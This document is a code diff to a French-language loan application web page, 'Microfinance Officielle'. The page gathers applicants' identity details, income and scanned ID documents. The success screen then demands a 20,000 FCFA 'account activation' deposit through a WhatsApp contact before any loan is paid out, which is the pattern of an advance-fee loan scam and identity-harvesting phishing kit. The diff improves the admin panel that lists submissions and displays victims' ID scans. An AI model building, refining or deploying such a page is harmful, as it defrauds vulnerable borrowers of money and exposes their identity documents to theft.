@@ -1,4 +1,4 @@
-<!doctype html>
+﻿<!doctype html>
 <html lang="fr">
 <head>
 <meta charset="utf-8">
@@ -67,13 +67,12 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
       <div class="logo" aria-hidden="true">
         <svg viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2Z" stroke="rgba(0,0,0,.35)" stroke-width="1.5"/><path d="M8.3 15.2c.8.9 2 1.6 3.7 1.6 2.3 0 3.8-1.2 3.8-3 0-1.6-1.2-2.4-3-2.7l-1.5-.3c-.9-.2-1.5-.6-1.5-1.3 0-.8.7-1.4 1.9-1.4 1 0 1.8.4 2.4 1.1" stroke="rgba(0,0,0,.35)" stroke-width="1.7" stroke-linecap="round"/></svg>
       </div>
-      <div><h1>Microfinance Officielle</h1><p>Demande de pr&ecirc;t &bull; Traitement rapide</p></div>
+      <div><h1>Microfinance Officielle</h1><p>Demande de prêt &bull; Traitement rapide</p></div>
     </div>
     <div class="pillbar">
-      <div class="pill">D&eacute;lai : <strong>24h</strong></div>
-      <div class="pill">Confidentialit&eacute; : <strong>assur&eacute;e</strong></div>
+      <div class="pill">Délai : <strong>24h</strong></div>
+      <div class="pill">Confidentialité : <strong>assurée</strong></div>
     </div>
-  </div>
   </header>
   <div class="grid">
     <section class="card" style="min-height:760px;">
@@ -82,30 +81,33 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <div style="font-weight:1000;font-size:26px">Microfinance Officielle</div>
         <div style="margin-top:6px;color:#000;opacity:.75;font-size:13px">Bienvenue. Remplissez le questionnaire et activez votre dossier.</div>
         <div style="margin-top:10px"><img src="./IMG-20260622-WA0034.jpg" style="width:90%;max-width:500px;border-radius:14px" alt="presentation"></div>
+      </div>
       <div class="hero">
         <h2 style="font-size:18px">Informations personnelles</h2>
         <p>Remplissez le formulaire. Une fois soumis, activez votre dossier via WhatsApp.</p>
         <div class="steps">
-          <div class="step"><div class="k">1) Donn&eacute;es personnelles</div><div class="d">Infos d'identit&eacute; et contact.</div></div>
-          <div class="step"><div class="k">2) Projet &amp; capacit&eacute;</div><div class="d">Objectif du pr&ecirc;t.</div></div></div>
+          <div class="step"><div class="k">1) Données personnelles</div><div class="d">Infos d'identité et contact.</div></div>
+          <div class="step"><div class="k">2) Projet &amp; capacité</div><div class="d">Objectif du prêt.</div></div>
+        </div>
+      </div>
       <form id="loanForm">
         <p class="sectionTitle">Informations utilisateur</p>
         <div id="formSteps">
+          <!-- PAGE 1 -->
           <div class="formPage" data-page="1">
             <div class="formGrid">
               <div class="full"><label>Email (obligatoire)</label><input name="email" type="email" required></div>
-              <div class="full"><label>Nom complet (obligatoire)</label><input name="fullName" type="text" required placeholder="Nom et pr&eacute;nom"></div>
+              <div class="full"><label>Nom complet (obligatoire)</label><input name="fullName" type="text" required placeholder="Nom et prénom"></div>
               <div class="full"><label>Date de naissance (obligatoire)</label><input name="birthDate" type="date" required></div>
               <div class="full"><label>Adresse (obligatoire)</label><input name="address" type="text" required placeholder="Quartier / Commune"></div>
-              <div class="full"><label>T&eacute;l&eacute;phone (obligatoire)</label><input name="phone" type="tel" required placeholder="Ex: +225..."></div>
+              <div class="full"><label>Téléphone (obligatoire)</label><input name="phone" type="tel" required placeholder="Ex: +225..."></div>
               <div class="full"><label>Type de document</label><select name="idDoc" required><option value="CNI">CNI</option><option value="Passeport">Passeport</option><option value="Permis">Permis</option><option value="Autre">Autre</option></select></div>
-              <div class="full"><label>Document d'identit&eacute; (PDF/JPG/PNG)</label><input name="idDocFile" type="file" accept="application/pdf,image/png,image/jpeg" required></div>
+              <div class="full"><label>Document d'identité (PDF/JPG/PNG)</label><input name="idDocFile" type="file" accept="application/pdf,image/png,image/jpeg" required></div>
             </div>
             <div class="pageNav">
               <div></div>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
-          </div>
           </div>
 
           <!-- PAGE 2 -->
@@ -113,71 +115,79 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
             <div class="formGrid">
               <div class="full"><h2 style="font-size:18px;margin-top:10px">Situation professionnelle</h2></div>
               <div class="full"><label>Emploi actuel</label><input name="job" type="text" required placeholder="Votre emploi"></div>
-              <div class="full"><label>Statut</label><select name="jobType" required><option value="Salari&eacute;">Salari&eacute;</option><option value="Ind&eacute;pendant">Ind&eacute;pendant</option><option value="Entrepreneur">Entrepreneur</option></select></div>
-              <div class="full"><label>Revenu mensuel</label><select name="incomeMonthly" required><option value="Moins de 100 000 FCFA">Moins de 100 000 FCFA</option><option value="100 000 &agrave; 300 000 FCFA">100 000 &agrave; 300 000 FCFA</option><option value="300 001 &agrave; 500 000 FCFA">300 001 &agrave; 500 000 FCFA</option><option value="Plus de 500 000 FCFA">Plus de 500 000 FCFA</option></select></div>
+              <div class="full"><label>Statut</label><select name="jobType" required><option value="Salarié">Salarié</option><option value="Indépendant">Indépendant</option><option value="Entrepreneur">Entrepreneur</option></select></div>
+              <div class="full"><label>Revenu mensuel</label><select name="incomeMonthly" required><option value="Moins de 100 000 FCFA">Moins de 100 000 FCFA</option><option value="100 000 à 300 000 FCFA">100 000 à 300 000 FCFA</option><option value="300 001 à 500 000 FCFA">300 001 à 500 000 FCFA</option><option value="Plus de 500 000 FCFA">Plus de 500 000 FCFA</option></select></div>
               <div class="full"><label>Autre source de revenus ?</label><select name="otherIncome" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
+            </div>
             <div class="pageNav">
-              <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
+              <button class="btnSecondary" type="button" onclick="prevPage()">Précédent</button>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
+          </div>
 
           <!-- PAGE 3 -->
           <div class="formPage hidden" data-page="3">
             <div class="formGrid">
-              <div class="full"><h2 style="font-size:18px;margin-top:10px">Objet du pr&ecirc;t</h2></div>
-              <div class="full"><label>Montant souhait&eacute;</label><input name="loanAmount" type="number" required min="10000" placeholder="Ex: 500000"></div>
-              <div class="full"><label>Dur&eacute;e</label><select name="repaymentTerm" required><option value="3 mois">3 mois</option><option value="6 mois">6 mois</option><option value="12 mois">12 mois</option><option value="24 mois">24 mois</option></select></div>
-              <div class="full"><label>D&eacute;j&agrave; eu un pr&ecirc;t ?</label><select name="previousLoan" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
-              <div class="full"><label>Objet (r&eacute;sum&eacute;)</label><textarea name="purpose" required placeholder="Ex: stock, &eacute;quipement..."></textarea></div>
+              <div class="full"><h2 style="font-size:18px;margin-top:10px">Objet du prêt</h2></div>
+              <div class="full"><label>Montant souhaité</label><input name="loanAmount" type="number" required min="10000" placeholder="Ex: 500000"></div>
+              <div class="full"><label>Durée</label><select name="repaymentTerm" required><option value="3 mois">3 mois</option><option value="6 mois">6 mois</option><option value="12 mois">12 mois</option><option value="24 mois">24 mois</option></select></div>
+              <div class="full"><label>Déjà eu un prêt ?</label><select name="previousLoan" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
+              <div class="full"><label>Objet (résumé)</label><textarea name="purpose" required placeholder="Ex: stock, équipement..."></textarea></div>
+            </div>
             <div class="pageNav">
-              <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
+              <button class="btnSecondary" type="button" onclick="prevPage()">Précédent</button>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
+          </div>
 
           <!-- PAGE 4 -->
           <div class="formPage hidden" data-page="4">
             <div class="formGrid">
               <div class="full"><h2 style="font-size:18px;margin-top:10px">Consentement</h2></div>
               <div class="full"><label>Consentement</label><select name="agree" required><option value="Oui">Oui, j'autorise</option><option value="Non">Non</option></select></div>
+            </div>
             <div class="pageNav">
-              <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
+              <button class="btnSecondary" type="button" onclick="prevPage()">Précédent</button>
               <button class="btn" type="submit" id="submitBtn">Soumettre</button>
             </div>
+          </div>
+        </div>
       </form>
 
       <!-- SUCCÈS -->
       <div id="successOverlay" style="display:none;padding:18px;">
         <div style="background:linear-gradient(135deg,rgba(45,212,191,.15),rgba(96,165,250,.15));border:2px solid rgba(45,212,191,.4);border-radius:18px;padding:24px;text-align:left;font-size:14px;line-height:1.7;">
-          <div style="font-weight:900;font-size:22px;color:var(--text);text-align:center;">&#10004; Formulaire soumis avec succ&egrave;s !</div>
+          <div style="font-weight:900;font-size:22px;color:var(--text);text-align:center;">&#10004; Formulaire soumis avec succès !</div>
           <div id="successUserLine" style="margin-top:8px;color:var(--muted);font-size:14px;text-align:center;"></div>
           <div style="margin-top:20px;border-top:1px solid var(--border);padding-top:20px;">
-            <div style="font-weight:900;font-size:18px;color:var(--text);margin-bottom:10px;">&#128204; &Eacute;tape finale : Activation de votre compte</div>
-            <div style="color:var(--text);margin-bottom:8px;">Pour valider d&eacute;finitivement votre inscription et d&eacute;bloquer l'acc&egrave;s &agrave; votre demande de pr&ecirc;t, vous devez proc&eacute;der &agrave; l'activation de votre compte client.</div>
+            <div style="font-weight:900;font-size:18px;color:var(--text);margin-bottom:10px;">&#128204; Étape finale : Activation de votre compte</div>
+            <div style="color:var(--text);margin-bottom:8px;">Pour valider définitivement votre inscription et débloquer l'accès à votre demande de prêt, vous devez procéder à l'activation de votre compte client.</div>
             <div style="color:var(--text);margin-bottom:4px;"><strong>Montant minimum :</strong> 20.000 FCFA</div>
             <div style="color:var(--text);margin-bottom:12px;"><strong>Frais de tenue de compte :</strong> gratuit</div>
             <div style="font-weight:800;font-size:16px;color:#25D366;margin-bottom:10px;">🟢 POUR FINALISER ET ACTIVER VOTRE COMPTE :</div>
-            <div style="color:var(--muted);margin-bottom:14px;">Cliquez sur le lien ci-dessous. Il ouvrira directement une discussion s&eacute;curis&eacute;e avec notre service client sur WhatsApp. Notre agent vous expliquera comment proc&eacute;der &agrave; votre d&eacute;p&ocirc;t en toute s&eacute;curit&eacute; :</div>
+            <div style="color:var(--muted);margin-bottom:14px;">Cliquez sur le lien ci-dessous. Il ouvrira directement une discussion sécurisée avec notre service client sur WhatsApp. Notre agent vous expliquera comment procéder à votre dépôt en toute sécurité :</div>
             <a id="waSuccessBtn" class="waBig" target="_blank" rel="noopener noreferrer" style="display:block;width:100%;padding:18px;background:#25D366;border:2px solid #128C7E;border-radius:14px;font-weight:900;font-size:16px;color:white;text-align:center;text-decoration:none;">💬 Activer mon compte via WhatsApp</a>
-            <div style="margin-top:16px;color:var(--text);font-weight:600;font-size:14px;">🛡️ Soyez rassur&eacute;(e), votre dossier est entre de bonnes mains. D&egrave;s que vous aurez contact&eacute; notre agent via le lien ci-dessus, le transfert de votre cr&eacute;dit sera programm&eacute;. Merci de votre confiance et bienvenue chez nous.</div>
+            <div style="margin-top:16px;color:var(--text);font-weight:600;font-size:14px;">🛡️ Soyez rassuré(e), votre dossier est entre de bonnes mains. Dès que vous aurez contacté notre agent via le lien ci-dessus, le transfert de votre crédit sera programmé. Merci de votre confiance et bienvenue chez nous.</div>
+          </div>
+        </div>
+      </div>
     </section>
 
     <!-- PANEL LATÉRAL -->
     <aside class="card">
-      <div style="padding:12px;text-align:right">
-      </div>
       <div id="rightPanelCollapse" style="max-height:1200px">
         <div class="side">
           <h3>Activation dossier</h3>
-          <div class="muted">Apr&egrave;s validation, un conseiller active votre cr&eacute;dit.</div>
+          <div class="muted">Après validation, un conseiller active votre crédit.</div>
           <div class="whatsapp">
             <div class="waLeft"><div class="h">WhatsApp Admin</div><div class="p">Activation dossier</div></div>
           </div>
           <div class="miniItem" style="border-color:rgba(96,165,250,.35);background:rgba(96,165,250,.07)">
-            <div class="t">&#128274; Acc&egrave;s Administrateur</div>
-            <div class="s">Voir les r&eacute;ponses utilisateurs</div>
+            <div class="t">&#128274; Accès Administrateur</div>
+            <div class="s">Voir les réponses utilisateurs</div>
             <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap">
               <button class="btnSecondary" type="button" onclick="showAdmin()">Entrer Admin</button>
-              <button class="btnSecondary" type="button" onclick="clearLocalDemo()">Effacer d&eacute;mo</button>
+              <button class="btnSecondary" type="button" onclick="clearLocalDemo()">Effacer démo</button>
             </div>
           </div>
         </div>
@@ -195,9 +205,9 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
       <div class="logo" aria-hidden="true">
         <svg viewBox="0 0 24 24" fill="none"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2Z" stroke="rgba(0,0,0,.35)" stroke-width="1.5"/><path d="M8.3 15.2c.8.9 2 1.6 3.7 1.6 2.3 0 3.8-1.2 3.8-3 0-1.6-1.2-2.4-3-2.7l-1.5-.3c-.9-.2-1.5-.6-1.5-1.3 0-.8.7-1.4 1.9-1.4 1 0 1.8.4 2.4 1.1" stroke="rgba(0,0,0,.35)" stroke-width="1.7" stroke-linecap="round"/></svg>
       </div>
-      <div><h1>Panel Administrateur</h1><p>Consultation des r&eacute;ponses</p></div>
-    <div class="pillbar"><div class="pill">Acc&egrave;s : <strong>Restreint</strong></div></div>
-  </div>
+      <div><h1>Panel Administrateur</h1><p>Consultation des réponses</p></div>
+    </div>
+    <div class="pillbar"><div class="pill">Accès : <strong>Restreint</strong></div></div>
   </header>
 
   <div class="grid">
@@ -207,6 +217,7 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         <div class="formGrid">
           <div class="full"><label>Email admin</label><input id="adminEmail" type="email" required></div>
           <div class="full"><label>Mot de passe</label><input id="adminPass" type="password" required></div>
+        </div>
         <div class="actions">
           <div class="notice">Accès réservé à l'administrateur.</div>
           <button class="btn" type="submit">Se connecter</button>
@@ -215,10 +226,10 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
 
       <div class="hero" id="adminArea" style="padding:12px 18px;display:none">
         <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px">
-          <div><h2 style="margin:0;font-size:18px">R&eacute;ponses des utilisateurs</h2></div>
+          <div><h2 style="margin:0;font-size:18px">Réponses des utilisateurs</h2></div>
           <div style="display:flex;gap:8px">
             <button class="btnSecondary" type="button" onclick="backPublic()">&larr; Vue publique</button>
-            <button class="btnSecondary" type="button" onclick="logoutAdmin()">D&eacute;connexion</button>
+            <button class="btnSecondary" type="button" onclick="logoutAdmin()">Déconnexion</button>
           </div>
         </div>
         <div style="margin-top:10px;display:flex;gap:10px;flex-wrap:wrap">
@@ -227,17 +238,18 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
         </div>
         <div style="margin-top:12px;border:1px solid var(--border);border-radius:14px;overflow:hidden">
           <div style="display:grid;grid-template-columns:1.2fr .8fr 1fr 70px;padding:10px 14px;border-bottom:1px solid var(--border);color:var(--muted);font-size:13px;font-weight:700;background:rgba(255,255,255,.03)">
-            <div>Email</div><div>T&eacute;l&eacute;phone</div><div>Montant</div><div style="text-align:center">Action</div>
+            <div>Email</div><div>Téléphone</div><div>Montant</div><div style="text-align:center">Action</div>
           </div>
           <div id="responsesTable" style="max-height:400px;overflow:auto"></div>
         </div>
         <div class="miniItem" style="margin-top:12px">
-          <div class="t" id="detailTitle">D&eacute;tail</div>
-          <div class="s" id="detailBody" style="white-space:pre-wrap;margin-top:6px;font-size:13px;color:var(--muted)">S&eacute;lectionnez une r&eacute;ponse.</div>
+          <div class="t" id="detailTitle">Détail</div>
+          <div class="s" id="detailBody" style="white-space:pre-wrap;margin-top:6px;font-size:13px;color:var(--muted)">Sélectionnez une réponse.</div>
         </div>
       </div>
     </section>
   </div>
+</div>
 
 <script>
 const ADMIN_WA = "639071042504";
@@ -254,8 +266,6 @@ function toast(t,m,v){
 }
 function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'<','>':'>','"':'"',"'":'&#39;'}[c]))}
 
-const waLink=document.getElementById('waLink');
-if(waLink) waLink.href='https://wa.me/'+ADMIN_WA;
 const waSuccessBtn=document.getElementById('waSuccessBtn');
 if(waSuccessBtn) waSuccessBtn.href='https://wa.me/'+ADMIN_WA+'?text=Bonjour%2C%20je%20souhaite%20activer%20mon%20compte';
 document.getElementById('year').textContent=new Date().getFullYear();
@@ -267,6 +277,12 @@ function loadAuth(){return localStorage.getItem(AUTH_KEY)==='1'}
 function saveAuth(){localStorage.setItem(AUTH_KEY,'1')}
 function clearAuth(){localStorage.removeItem(AUTH_KEY)}
 
+function togglePanel(){
+  const p=document.getElementById('rightPanelCollapse');
+  if(!p)return;
+  p.classList.toggle('isClosed');
+  p.classList.toggle('isOpen');
+}
 function showAdmin(){
   const publicView=document.getElementById('publicView');
   const adminView=document.getElementById('adminView');
@@ -286,11 +302,11 @@ function logoutAdmin(){
   clearAuth();
   document.getElementById('adminArea').style.display='none';
   document.getElementById('adminLogin').style.display='block';
-  toast('Deconnexion','Session terminee.','ok');
+  toast('Déconnexion','Session terminée.','ok');
 }
 function clearLocalDemo(){
   localStorage.removeItem(STORAGE_KEY);
-  toast('Efface','Donnees demo supprimees.','ok');
+  toast('Effacé','Données démo supprimées.','ok');
   if(loadAuth())renderResponses();
 }
 
@@ -409,8 +425,8 @@ document.getElementById('loanForm').addEventListener('submit',function(e){
 
     document.getElementById('loanForm').style.display='none';
     document.getElementById('successOverlay').style.display='block';
-    document.getElementById('successUserLine').textContent='Bonjour '+(data.fullName||'')+' -- votre demande a ete enregistree.';
-    toast('Succes','Formulaire envoye !','ok');
+    document.getElementById('successUserLine').textContent='Bonjour '+(data.fullName||'')+' -- votre demande a été enregistrée.';
+    toast('Succès','Formulaire envoyé !','ok');
   };
   reader.readAsDataURL(f);
 });
@@ -470,11 +486,11 @@ async function renderResponses(){
       if(d.success&&d.submissions){
         items=d.submissions;
         renderTable(items);
-        document.getElementById('detailTitle').textContent='Detail';
-        document.getElementById('detailBody').textContent='Selectionnez une reponse.';
+        document.getElementById('detailTitle').textContent='Détail';
+        document.getElementById('detailBody').textContent='Sélectionnez une réponse.';
         return;
       }
-}catch(e){
+    }catch(e){
       console.warn('API inaccessible, utilisation des données locales');
     }
   }
@@ -488,9 +504,9 @@ function renderTable(items){
   if(!t)return;
   t.innerHTML='';
   if(!items||!items.length){
-    t.innerHTML='<div style="padding:14px;color:var(--muted)">Aucune reponse.</div>';
-    document.getElementById('detailTitle').textContent='Detail';
-    document.getElementById('detailBody').textContent='Selectionnez une reponse.';
+    t.innerHTML='<div style="padding:14px;color:var(--muted)">Aucune réponse.</div>';
+    document.getElementById('detailTitle').textContent='Détail';
+    document.getElementById('detailBody').textContent='Sélectionnez une réponse.';
     return;
   }
   items.forEach(function(r){
@@ -506,58 +522,98 @@ function renderTable(items){
 }
 function showDetail(r){
   var name=r.full_name||r.fullName||r.email||'';
-  document.getElementById('detailTitle').textContent='Detail : '+name;
+  document.getElementById('detailTitle').textContent='Détail : '+name;
   var tok=localStorage.getItem('admin_token');
   if(tok&&r.id){
     fetch('/api/response/'+r.id,{headers:{'Authorization':'Bearer '+tok}})
       .then(function(res){return res.json()})
-      .then(function(d){if(d.success&&d.submission)renderDetail(d.submission)})
-      .catch(function(err){console.warn('Erreur chargement détail:',err)});
-  } else if(!tok) {
+      .then(function(d){
+        if(d.success&&d.submission){
+          renderDetail(d.submission);
+        } else {
+          renderDetail(r);
+        }
+      })
+      .catch(function(){
+        renderDetail(r);
+      });
+  } else {
     renderDetail(r);
   }
 }
 function renderDetail(r){
-  var s='';
-  for(var k in r){
-    if(k==='idDocFileBase64')continue;
-    s+=k+': '+(r[k]||'-')+'\n';
+  var lines=[];
+  if(r.full_name||r.fullName) lines.push('Nom: '+(r.full_name||r.fullName));
+  if(r.email) lines.push('Email: '+r.email);
+  if(r.phone) lines.push('Téléphone: '+r.phone);
+  if(r.birth_date||r.birthDate) lines.push('Date naissance: '+(r.birth_date||r.birthDate));
+  if(r.address) lines.push('Adresse: '+r.address);
+  if(r.id_doc||r.idDoc) lines.push('Document: '+(r.id_doc||r.idDoc));
+  if(r.job) lines.push('Emploi: '+r.job);
+  if(r.job_type||r.jobType) lines.push('Statut: '+(r.job_type||r.jobType));
+  if(r.income_monthly||r.incomeMonthly) lines.push('Revenu: '+(r.income_monthly||r.incomeMonthly));
+  if(r.other_income||r.otherIncome) lines.push('Autre revenu: '+(r.other_income||r.otherIncome));
+  if(r.loan_amount||r.loanAmount) lines.push('Montant: '+(r.loan_amount||r.loanAmount)+' FCFA');
+  if(r.repayment_term||r.repaymentTerm) lines.push('Durée: '+(r.repayment_term||r.repaymentTerm));
+  if(r.previous_loan||r.previousLoan) lines.push('Prêt antérieur: '+(r.previous_loan||r.previousLoan));
+  if(r.purpose) lines.push('Objet: '+r.purpose);
+  if(r.agree) lines.push('Consentement: '+r.agree);
+  if(r.created_at||r.createdAt) lines.push('Date: '+(r.created_at||r.createdAt));
+  var html=lines.map(function(l){return '<div style="padding:3px 0">'+esc(l)+'</div>';}).join('')||'Aucun détail disponible.';
+  var fileB64=r.id_doc_file_base64||r.idDocFileBase64||'';
+  var fileNm=r.id_doc_file_name||r.idDocFileName||'';
+  var fileMime=r.id_doc_file_mime||r.idDocFileMime||'';
+  if(fileB64&&fileNm){
+    html+='<div style="margin-top:14px;border-top:1px solid var(--border);padding-top:12px;">';
+    html+='<div style="font-weight:700;font-size:14px;margin-bottom:8px;">📎 Document : '+esc(fileNm)+'</div>';
+    html+='<div style="max-width:100%;overflow:hidden;border-radius:10px;border:1px solid var(--border);padding:4px;text-align:center;">';
+    if(fileMime.startsWith('image/')){
+      html+='<img src="'+fileB64+'" alt="Document" style="max-width:100%;max-height:400px;border-radius:8px;display:block;margin:0 auto;" />';
+    } else {
+      html+='<iframe src="'+fileB64+'" style="width:100%;height:500px;border:none;border-radius:8px;" title="PDF"></iframe>';
+      html+='<div style="margin-top:8px"><a href="'+fileB64+'" target="_blank" rel="noopener" style="display:inline-block;padding:10px 20px;background:linear-gradient(135deg,rgba(45,212,191,1),rgba(96,165,250,1));color:#001018;border-radius:10px;font-weight:700;text-decoration:none;">📥 Ouvrir</a></div>';
+    }
+    html+='</div></div>';
   }
-  document.getElementById('detailBody').textContent=s||'Aucun detail.';
+  document.getElementById('detailBody').innerHTML=html;
 }
-async function deleteRow(id,email){
-  if(!id||!email)return;
-  if(!confirm('Supprimer la reponse de '+email+' ?'))return;
+function deleteRow(id, email){
+  if(!confirm('Supprimer la soumission de '+esc(email||'')+' ?'))return;
   var tok=localStorage.getItem('admin_token');
   if(tok){
-    try{
-      var res=await fetch('/api/delete',{
-        method:'DELETE',
-        headers:{'Content-Type':'application/json','Authorization':'Bearer '+tok},
-        body:JSON.stringify({id:id})
-      });
-      var d=await res.json();
+    fetch('/api/delete?id='+encodeURIComponent(id),{
+      method:'DELETE',
+      headers:{'Authorization':'Bearer '+tok}
+    })
+    .then(function(res){return res.json()})
+    .then(function(d){
       if(d.success){
-        toast('Supprime','Reponse supprimee.','ok');
+        toast('Supprimé','Soumission supprimée avec succès.','ok');
         renderResponses();
-        return;
+      } else {
+        toast('Erreur',d.error||'Impossible de supprimer.','err');
+        fallbackDeleteLocal(id);
       }
-    }catch(e){}
+    })
+    .catch(function(){
+      fallbackDeleteLocal(id);
+    });
+  } else {
+    fallbackDeleteLocal(id);
   }
-  var list=loadResp().filter(function(r){return r.id!==id});
-  saveResp(list);
-  toast('Supprime','Reponse locale supprimee.','ok');
-  renderResponses();
 }
-function togglePanel(){
-  const p=document.getElementById('rightPanelCollapse');
-  if(!p)return;
-  p.classList.toggle('isClosed');
-  p.classList.toggle('isOpen');
+function fallbackDeleteLocal(id){
+  var list=loadResp();
+  var filtered=list.filter(function(r){return r.id!==id});
+  if(filtered.length!==list.length){
+    saveResp(filtered);
+    toast('Supprimé','Soumission locale supprimée.','ok');
+    renderResponses();
+  } else {
+    toast('Erreur','Soumission introuvable.','err');
+  }
 }
 
-window.nextPage=nextPage;
-window.prevPage=prevPage;
 window.showAdmin=showAdmin;
 window.backPublic=backPublic;
 window.logoutAdmin=logoutAdmin;
@@ -565,3 +621,12 @@ window.renderResponses=renderResponses;
 window.clearLocalDemo=clearLocalDemo;
 window.togglePanel=togglePanel;
 window.deleteRow=deleteRow;
+
+// Hash routing: if URL ends with #admin, show admin panel
+if(window.location.hash==='#admin'){
+  showAdmin();
+}
+</script>
+</body>
+</html>
+
